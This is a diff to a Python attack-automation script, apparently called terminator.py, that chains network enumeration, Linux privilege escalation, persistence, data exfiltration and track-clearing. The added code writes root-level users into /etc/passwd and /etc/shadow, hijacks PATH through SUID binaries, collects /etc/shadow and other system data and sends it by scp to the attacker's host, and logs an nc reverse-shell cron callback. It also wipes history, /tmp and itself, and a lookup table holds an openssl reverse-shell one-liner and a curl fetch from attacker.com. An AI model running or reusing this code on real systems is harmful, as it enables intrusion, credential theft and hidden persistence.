@@ -80,16 +80,15 @@ def init_scan(ip):
    ports = []
    services = {}
 
-   # make enum directory for output files and /terminator directory for data exfil
-   os.system("mkdir enum/")
+   # make terminator directory for output files
    os.system("mkdir /terminator/")
 
    # run initial port scan
    print("\n### finding open ports... ###")
-   os.system("nmap -vv -sS -n -Pn -T5 -p- {} -oN enum/scan_1".format(ip))
+   os.system("nmap -vv -sS -n -Pn -T5 -p- {} -oN /terminator/scan_1".format(ip))
 
    # get ports for next scan
-   with open("{}/enum/scan_1".format(pwd)) as scan_1:
+   with open("{}/terminator/scan_1".format(pwd)) as scan_1:
       lines_1 = scan_1.readlines()
       for line in lines_1:
          number = re.search("\A[1-9][0-9]",line)
@@ -101,15 +100,14 @@ def init_scan(ip):
          else:
             continue
 
-
    print("\n### open ports: {}".format(ports))
    time.sleep(3)
    print("\n### finding services for ports... ###")
    port_scan = ",".join(ports)
-   os.system("nmap -vv -A -p {} {} -oN enum/scan_2".format(port_scan,ip))
+   os.system("nmap -vv -A -p {} {} -oN /terminator/scan_2".format(port_scan,ip))
 
    # get services for open ports
-   with open("{}/enum/scan_2".format(pwd)) as scan_2:
+   with open("{}/terminator/scan_2".format(pwd)) as scan_2:
       lines_2 = scan_2.readlines()
       for line in lines_2:
          number = re.search("\A[1-9][0-9]",line)
@@ -144,54 +142,49 @@ def web(ip,wordlist,services):
          continue
 
    print("\n### running nikto... ###")
-   os.system("nikto -h {} -o enum/nikto.txt".format(ip))
+   os.system("nikto -h {} -o /terminator/nikto.txt".format(ip))
    print("\n### running gobuster... ###")
    if wordlist:
-      os.system("gobuster dir -u {} -w {} | tee enum/dir_walk.txt".format(ip,wordlist))
+      os.system("gobuster dir -u {} -w {} | tee /terminator/dir_walk.txt".format(ip,wordlist))
    else:
-      os.system("gobuster dir -u {} -w directory-list.txt | tee enum/dir_walk.txt".format(ip))
+      os.system("gobuster dir -u {} -w directory-list.txt | tee /terminator/dir_walk.txt".format(ip))
    for port in web_port:
       print("\n### curling robots.txt for {}:{}... ###".format(ip,port))
-      os.system("curl http://{}:{}/robots.txt | tee enum/robots.txt".format(ip,port.strip()))
+      os.system("curl http://{}:{}/robots.txt | tee /terminator/robots.txt".format(ip,port.strip()))
    print("\n### looking for webserver vulnerabilities in searchsploit... ###")
-   os.system("searchsploit {} | tee enum/searchsploit.txt".format(services["http"]))
+   os.system("searchsploit {} | tee /terminator/searchsploit.txt".format(services["http"]))
 
-   print("\n### web enum output saved to nikto.txt, dir_walk.txt, robots.txt, and searchsploit.txt in enum/ ###")
+   print("\n### web enum output saved to nikto.txt, dir_walk.txt, robots.txt, and searchsploit.txt in /terminator/ ###")
 
 
 # use enum4linux and nmap to enumerate smb shares/users
 def smb(ip):
    print("\n### initiating smb enumeration... ###")
-   os.system("enum4linux -A {} | tee enum/smb_enum.txt".format(ip))
-   os.system("nmap -vv -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {} -oN enum/smb_nmap.txt".format(ip))
-   print("\n### smb enum output saved to enum/smb_nmap.txt ###")
+   os.system("enum4linux -A {} | tee /terminator/smb_enum.txt".format(ip))
+   os.system("nmap -vv -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {} -oN /terminator/smb_nmap.txt".format(ip))
+   print("\n### smb enum output saved to /terminator/smb_nmap.txt ###")
 
 
 # use nmap to try ftp anonymous login
 def ftp(ip):
    print("\n### initiating ftp enumeration... ###")
-   os.system("nmap -vv -p 21 --script=ftp-anon {} -oN enum/ftp_nmap.txt".format(ip))
-   print("\n### ftp enum output saved to enum/ftp_nmap.txt ###")
+   os.system("nmap -vv -p 21 --script=ftp-anon {} -oN /terminator/ftp_nmap.txt".format(ip))
+   print("\n### ftp enum output saved to /terminator/ftp_nmap.txt ###")
 
 
 # use nmap to show NFS mounts
 def nfs(ip):
    print("\n### initiating nfs enumeration... ###")
-   os.system("nmap -vv -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {} -oN enum/nfs_nmap.txt".format(ip))
-   print("\n### nfs enum output saved to enum/nfs_nmap.txt ###")
+   os.system("nmap -vv -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {} -oN /terminator/nfs_nmap.txt".format(ip))
+   print("\n### nfs enum output saved to /terminator/nfs_nmap.txt ###")
 
 
 # privilege escalation ###############################
 
 # disable history logging and create backups
 def disable_hist():
-   # check to see if user needs password to run sudo
-   sudo_time = os.system("time timeout -k 5 5 sudo -l > /tmp/sudo_l.txt")
-   sudo_no_pass = None
-   if sudo_time > float('1.0'):
-     sudo_no_pass = False
-   else:
-      sudo_no_pass = True
+   # create file to write data to
+   os.system("touch /tmp/pwd.txt")
 
    print("\n### creating backups of log files... ###")
    os.system("mkdir /tmp/.backups")
@@ -205,19 +198,21 @@ def disable_hist():
    os.system("history -c 2>/dev/null")
    os.system("history -w 2>/dev/null")
 
-   # create file to write data to
-   os.system("touch /tmp/pwd.txt")
-   # create file to write data to
-   os.system("touch /tmp/data_exfil.txt")
-
-   return sudo_no_pass
-
 
 # check for binaries that can be run as sudo and print privesc script to screen
 def sudo_l():
-   print("\n###--- please run 'sudo -l > /tmp/sudo_l.txt' before running this script to find sudoable commands ---###")
+   os.system("echo '### sudo-l results ###' > /tmp/sudo_l.txt")
+   print("\n###--- please run 'sudo -l >> /tmp/sudo_l.txt' before running this script to find sudoable commands ---###")
    time.sleep(5)
    print("\n### finding binaries you can run as sudo... ###")
+
+   # check to see if user needs password to run sudo
+   sudo_time = os.system("time timeout -k 5 5 sudo -l")
+   sudo_no_pass = None
+   if sudo_time > float('1.0'):
+     sudo_no_pass = False
+   else:
+      sudo_no_pass = True
 
    # commands that will be printed to screen bc they require user interation 
    sudo_bins_print = {
@@ -259,8 +254,8 @@ def sudo_l():
 
 
    # open last line of sudo -l output to determine sudo capabilities
-   with open('/tmp/sudo_l.txt', 'r') as pwd:
-      last_line = pwd.readlines()[-1]
+   with open('/tmp/sudo_l.txt', 'r') as sudol:
+      last_line = sudol.readlines()[-1]
       lower_line = last_line.lower()
       print(lower_line)
 
@@ -268,6 +263,7 @@ def sudo_l():
       for key in sudo_bins_print:
          if key in lower_line:
             print("{}: {}".format(key,sudo_bins_print[key]))
+            os.system("echo '{}:{} can be used for privilege escalation' >> /tmp/esc.txt".format(key,sudo_bins_print[key]))
             continue
          else:
             continue
@@ -275,16 +271,20 @@ def sudo_l():
       for key in sudo_bins_exec:
          if key in lower_line:
             print("{}: {}".format(key,sudo_bins_exec[key]))
+            os.system("echo '### {}:{} can be used for privilege escalation ###' >> /tmp/esc.txt".format(key,sudo_bins_print[key]))
             sudo_cmd = sudo_bins_exec[key].strip()
             os.system(sudo_cmd)
             exit()
          else:
             continue
 
+   return sudo_no_pass
 
 # try SUID/GUID files exloitation
 def suid():
    print("\n### finding SUID files... ###")
+   os.system("echo '### suid file search results ###' > /tmp/suid.txt")
+
    suid_bins_print = {
    "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
    "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
@@ -322,24 +322,27 @@ def suid():
    "zsh":"./zsh"
    }
 
-    # loop through dictionaries and print cmds if need user interaction, otherwise execute
-   os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/pwd.txt")
-   with open("/tmp/sudo_l.txt") as suid_file:
+   # find suid binaries, loop through dictionaries and print cmds if need user interaction, otherwise execute
+   os.system("find / -type f -perm /4000 2>/dev/null | tee -a /tmp/suid.txt")
+   with open("/tmp/suid.txt") as suid_file:
       suid = suid_file.readlines()
       for line in suid:
          if ".sh" in line:
             print(line)
+            os.system("echo '### {} is a suid binary and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(line))
          else:
             continue
       for key in suid_bins_print:
          if key in suid:
-            print("\n{}: {}".format(key,value))
+            print("\n{}: {}".format(key,suid_bins_print[key]))
+            os.system("echo '### {}:{} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key,suid_bins_print[key]))
          else:
             continue
 
       for key in suid_bins_exec:
          if key in suid:
-            print("\n{}: {}".format(key,value))
+            print("\n{}: {}".format(key,suid_bins_exec[key]))
+            os.system("echo '### {} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key,suid_bins_exec[key]))
             suid_cmd = value.strip()
             os.system(suid_cmd)
             break
@@ -350,7 +353,7 @@ def suid():
 # try SUID executables for $PATH exploitation
 def path():
    print("\n### running strings on SUID executables & searching for cmds w/o fill path (might want to check manually as well)")
-    
+   
    common_cmds = ["base64", "bash", "chmod", "cp", "dig", "docker", "env", "file", "find", "gzip", "mosquitto", "mv", 
    "nmap", "openvpn", "perl", "php", "python", "mysql", "rsync", "strings", "systemctl", "unzip", "vim", "wc", "wget", 
    "zsh", "ls", "ftp", "apache2", "apache", "ssh", "ps", "ss", "cat", "touch", "mkdir", "cd", "rm", "nc", "service", 
@@ -358,9 +361,10 @@ def path():
    "git", "gh", "vi", "nano"]
 
    os.system("mkdir /tmp/.path/")
+   os.system("echo '### possible undefined $PATH binary vulnerabilities ###' >> /tmp/path_res.txt")
+   os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/path.txt")
    print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
-   os.system("find / type f -perm /4000 2>/dev/null | tee /tmp/pwd.txt")
-   with open("/tmp/pwd.txt") as root_files:
+   with open("/tmp/path.txt") as root_files:
       lines = root_files.readlines()
       for line in lines:
          split_path = line.split("/")
@@ -373,6 +377,7 @@ def path():
                non_path_cmd = re.search("\s{}\s".format(cmd), str(lines_strings))
                   if non_path_cmd:
                      print("### {} does not specify full path of {} ###".format(line,cmd))
+                     os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
                      os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
                      break
                   else:
@@ -380,38 +385,44 @@ def path():
 
 
 # try writing to /etc/passwd or /etc/shadow
-def pass_shadow():
+def pass_shadow(username,password):
    print("\n### checking if /etc/passwd or /etc/shadow are writable... ###")
+   os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
+   pass_file = open("/tmp/.backups/pass.txt", "r")
+   new_user_pass = pass_file.readlines()[-1].strip()
 
    # check if /etc/passwd is writable and if so, add root user
-   os.system("ls -l /etc/passwd > /tmp/pwd.txt")
-   with open("/tmp/pwd.txt") as passwd:
+   os.system("ls -l /etc/passwd > /tmp/passwd.txt")
+   with open("/tmp/passwd.txt") as passwd:
       perms = passwd.readline()
       writable = re.search("\\A.......rw|\\A.......-w", perms)
       if writable:
          print("\n### /etc/passwd is writable! creating user 'root1':'password'... ###")
-         os.system("echo 'root1:$1$pass$1K/wwgbgGDqTdxG.EHS8F1:0:0:root1:/root:/bin/bash' >> /etc/passwd")
+         os.system("echo '{}:{}:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,new_user_pass,username,username))
          print("\n### root-group user 'root1':'password' created... :su root1 ###")
+         os.system("echo '### /etc/passwd is world-writable and can be exploited for privilege excalation ###' > /tmp/passwd_res.txt")
       else:
          print("\n*** /etc/passwd is not writable ***")
 
    # check if /etc/shadow is writable and if so, add root user
-   os.system("ls -l /etc/shadow > /tmp/pwd.txt")
-   with open("/tmp/pwd.txt") as shadow:
+   os.system("ls -l /etc/shadow > /tmp/shad.txt")
+   with open("/tmp/shad.txt") as shadow:
       perms = shadow.readline()
       writable = re.search("\\A.......rw|\\A.......-w", str(shadow))
       if writable:
-         print("\n### /etc/shadow is writable! creating user 'root1':'password'... ###")
-         os.system("echo 'root1:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' >> /etc/shadow")
+         print("\n### /etc/shadow is writable! creating user '{}':'{}'... ###".format(username,password))
+         os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
          print("\n### root-group user 'root1':'password' created... :su root1 ###")
+         os.system("echo '### /etc/shadow is world-writable and can be exploited for privilege excalation ###' > /tmp/shad_res.txt")
       else:
          print("\n*** /etc/shadow is not writable ***")
+   pass_file.close()
 
 
 # check for root
 def root_check():
-   os.system("id > /tmp/pwd.txt")
-   with open("/tmp/pwd.txt") as check:
+   os.system("id > /tmp/check.txt")
+   with open("/tmp/check.txt") as check:
       read_check = check.readline()
       if "root" in read_check:
          print("\n-+- welcome, root -+-")
@@ -471,37 +482,63 @@ def cron_make():
 
 
 # data exfiltration ###############################
-def extract(local_ip):
+def extract(username,password,local_ip,local_port):
    # write data to file
    print("\n### exfiltrating data... ###")
 
+   # create file to write data to
+   os.system("touch /tmp/data_exfil.txt")
+
+   # add peristence data to file
+   os.system("echo '### persistence established with the following ###' >> /tmp/data_exfil.txt")
+   os.system("echo 'user {}:{} was added with root privileges' >> /tmp/data_exfil.txt".format(username,password))
+   os.system("echo 'nc reverse shell callback implanted at /dev/shm/.data/data_log' >> /tmp/data_exfil.txt")
+   os.system("echo 'cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}' >> /tmp/data_exfil.txt".format(local_ip,local_port))
+
    # get system info and write to data file
-   print("")
+   print("echo '' >> /tmp/data_exfil.txt")
+   os.system("echo '### the following data was extracted as root user ###' >> /tmp/data_exfil.txt")
+   os.system("echo 'id:' >> /tmp/data_exfil.txt")
    os.system("id | tee -a /tmp/data_exfil.txt")
+   os.system("echo 'whoami:' >> /tmp/data_exfil.txt")
    os.system("whoami | tee -a /tmp/data_exfil.txt")
+   os.system("echo 'netstat -tnlp:' >> /tmp/data_exfil.txt")
    os.system("netstat -tnpl | tee -a /tmp/data_exfil.txt")
 
    print("\n### /etc/passwd: ###")
+   os.system("echo '/etc/passwd:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/passwd | tee -a /tmp/data_exfil.txt")
 
    print("\n### /etc/shadow: ###")
+   os.system("echo '/etc/shadow:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/shadow | tee -a /tmp/data_exfil.txt")
 
    print("\n### /etc/hosts: ###")
+   os.system("echo '/etc/hosts:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/hosts | tee -a")
 
    print("\n### /etc/crontab: ###")
+   os.system("echo '/etc/crontab:' >> /tmp/data_exfil.txt")
    os.system("cat /etc/crontab | tee -a /tmp/data_exfil.txt")
 
    print("\n### /etc/exports: ###")
-   os.system("cat /etc/exports | tee -a /tmp/data_exfil.txt")
+   os.system("echo '/etc/exports:' >> /tmp/data_exfil.txt")
+   os.system("cat /etc/exports 2>/dev/null | tee -a /tmp/data_exfil.txt")
 
    print("\n### SUID files: ###")
+   os.system("echo 'suid files:' >> /tmp/data_exfil.txt")
    os.system("find / type -f perm /4000 2>/dev/null | tee -a /tmp/data_exfil.txt")
 
-   os.system("")
+   # compile previous files into one for scp
+   os.system("cat /tmp/esc.txt >> /tmp/sudo_l.txt")
+   os.system("cat /tmp/sudo_l.txt >> /tmp/data_exfil.txt")
+   os.system("cat /tmp/suid_esc.txt >> /tmp/suid.txt")
+   os.system("cat /tmp/suid.txt >> /tmp/data_exfil.txt")
+   os.system("cat /tmp/path_res.txt >> /tmp/data_exfil.txt")
+   os.system("cat /tmp/passwd_res.txt >> /tmp/data_exfil.txt")
+   os.system("cat /tmp/shad_res.txt >> /tmp/data_exfil.txt")
 
-   # exfil the data file to local machine
+   # exfil the data files to local machine
    print("\n### sending data to root@{}/terminator/scp_output.txt... ###\n+input your local machine root password+".format(local_ip))
    os.system("scp /tmp/data_exfil.txt root@{}:/terminator/scp_output.txt".format(local_ip))
    print("\n*** data_exfil.txt sent to {}/terminator/scp_output.txt ***".format(local_ip))
@@ -537,6 +574,15 @@ def clear_tracks():
    os.system("rm -f /tmp/pwd.txt")
    os.system("rm -f /tmp/sudo_l.txt")
    os.system("rm -f /tmp/data_exfil.txt")
+   os.system("rm -f /tmp/check.txt")
+   os.system("rm -f /tmp/suid.txt")
+   os.system("rm -f /tmp/passwd.txt")
+   os.system("rm -f /tmp/shad.txt")
+   os.system("rm -f /tmp/esc.txt")
+   os.system("rm -f /tmp/suid_esc.txt")
+   os.system("rm -f /tmp/path_res.txt")
+   os.system("rm -f /tmp/passwd_res.txt")
+   os.system("rm -f /tmp/shad_res.txt")
    os.system("rm -rf /tmp/* 2>/dev/null")
    os.system("rm -f terminator.py")
    exit()
@@ -552,7 +598,7 @@ if level == "enum":
    init_scan(ip)
    for item in tot:
       if item == "80" or item == "8080" or item == "http":
-         web(ip,wordlist)
+         web(ip,wordlist,services)
          continue
       elif item == "139" or item == "445" or item == "smb" or item == "samba":
          smb(ip)
@@ -563,14 +609,14 @@ if level == "enum":
       elif item == "111" or item == "nfs":
          nfs(ip)
       else:
-        print("\n### scan complete... view enum/ and continue with manual enumeration ###")
+        print("\n### scan complete... view /terminator/ and continue with manual enumeration ###")
 elif level == "priv":
    # call privilege escalation functions
    disable_hist()
    sudo_l()
    suid()
    path()
-   pass_shadow()
+   pass_shadow(username,password)
    root_check()
 elif level == "root":
    # call persistence and data exfil functions
@@ -581,11 +627,11 @@ elif level == "root":
       add_user(username, password)
       callback(local_ip, local_port)
       cron_make()
-      extract(local_ip)
+      extract(username,password,local_ip,local_port)
       clear_tracks()
 
 elif level == "report":
    # call report functions
    pass
 else:
-   print("\n*** specify either 'enum', 'priv', 'root', or 'report' ***")
+   print("\n*** specify either 'enum', 'priv','root' or 'report' ***")
